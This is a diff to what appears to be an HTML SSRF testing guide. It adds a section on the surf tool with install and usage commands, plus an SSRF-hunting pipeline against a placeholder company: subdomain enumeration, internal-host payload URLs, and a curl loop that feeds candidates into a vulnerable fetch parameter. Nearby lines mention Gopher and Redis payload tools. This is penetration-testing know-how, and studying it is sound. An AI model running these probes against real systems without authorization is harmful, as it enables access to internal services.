@@ -306,6 +306,44 @@ interactsh-client
 # Test: ?url=http://xxxxxxxx.oast.live/probe
 # Watch for DNS and HTTP callbacks</code></pre>
 
+  <h3>surf — SSRF Candidate Discovery</h3>
+  <p>surf identifies viable SSRF candidates from a list of subdomains/hosts. It probes each host from your machine — hosts that don't respond externally but resolve to internal IPs are prime SSRF targets, since traditional SSRF filters usually only block private IP ranges by explicit blacklist.</p>
+  <pre><code># Install (requires Go 1.19+):
+go install github.com/assetnote/surf/cmd/surf@latest
+
+# Find all SSRF candidates from a subdomain list:
+surf -l bigcorp.txt
+
+# With timeout and concurrency tuning:
+surf -l bigcorp.txt -t 10 -c 200
+
+# Print all hosts without SSRF analysis (raw list only):
+surf -l bigcorp.txt -d
+
+# Find hosts resolving to internal IPs only (no HTTP probing):
+surf -l bigcorp.txt -x
+
+# Options:
+# -l FILE     list of hosts or subdomains
+# -c N        concurrency (default 100)
+# -t N        timeout in seconds (default 3)
+# -r N        retries on failure (default 2)
+# -x          disable HTTP probing, only output internal-resolving hosts
+# -d          disable analysis, output raw list
+
+# Output files saved automatically:
+# external-&lt;timestamp&gt;.txt  — resolves externally but HTTP unreachable (highest value SSRF targets)
+# internal-&lt;timestamp&gt;.txt  — resolves to RFC1918 address
+
+# Workflow — SSRF hunting pipeline:
+# 1. Enumerate subdomains: subfinder -d bigcorp.com -o subs.txt
+# 2. Filter SSRF candidates: surf -l subs.txt -c 200 -t 5
+# 3. Use external-*.txt targets as SSRF payloads in application parameters:
+#    ?url=http://s3-internal.bigcorp.com/    (external IP, not blocked by IP filters)
+#    ?url=http://internal-app.bigcorp.com/   (internal IP, classic SSRF)
+# 4. Try each candidate against SSRF-vulnerable parameters:
+#    while read host; do curl -s "https://app.bigcorp.com/fetch?url=http://$host/" -o /dev/null -w "$host: %{http_code}\n"; done &lt; external-candidates.txt</code></pre>
+
   <h3>SSRF Tools</h3>
   <pre><code># Gopherus — generate Gopher payloads for Redis, MySQL, FastCGI, Memcache:
 git clone https://github.com/tarunkant/Gopherus
@@ -331,4 +369,5 @@ python ssrfmap.py -r req.txt -p url -m redis
     <li>interactsh — <code>github.com/projectdiscovery/interactsh</code></li>
     <li>Gopherus — <code>github.com/tarunkant/Gopherus</code></li>
     <li>SSRFmap — <code>github.com/swisskyrepo/SSRFmap</code></li>
+    <li>surf — SSRF candidate finder — <code>github.com/assetnote/surf</code></li>
   </ul>
